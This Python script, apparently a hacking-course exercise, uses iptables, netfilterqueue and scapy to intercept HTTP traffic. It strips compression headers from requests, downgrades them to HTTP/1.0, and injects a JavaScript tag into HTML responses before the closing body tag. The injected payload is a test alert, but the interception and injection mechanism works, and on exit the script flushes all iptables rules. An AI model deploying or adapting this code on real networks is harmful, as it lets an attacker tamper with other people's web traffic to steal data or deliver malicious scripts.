#! /usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess
import re

def load_spoof(pac, load):
    pac[scapy.Raw].load = load
    del pac[scapy.IP].len
    del pac[scapy.IP].chksum
    del pac[scapy.TCP].chksum
    return pac


def process_pac(packet):
    pac = scapy.IP(packet.get_payload())
    if pac.haslayer(scapy.Raw):
        modify = pac[scapy.Raw].load
        if pac[scapy.TCP].dport == 80:
            print("This is Request")
            modify = re.sub("Accept-Encoding:\s.*?\\r\\n", "", modify)
            modify = modify.replace("HTTP/1.1", "HTTP/1.0")
            # pac.show()
        elif pac[scapy.TCP].sport == 80:
            print("this is response")
            script = "<script>alert('Tesssst');</script>"
            modify = modify.replace("</body>", script+"</body>")

            con_len_src = re.search("(?:Content-Length:\s)(\d*)", modify)
            # if con_len_src and "text/html" in modify:
            #     con_len = con_len_src(1)
            #     len = int(con_len) + len(script)
            #     modify = modify.replace(con_len, str(len))
            pac.show()
        if modify != pac[scapy.Raw].load:
            pac = load_spoof(pac, modify)
            packet.set_payload(str(pac))
    packet.accept()


try:
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    que = netfilterqueue.NetfilterQueue()
    que.bind(0, process_pac)
    que.run()

except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
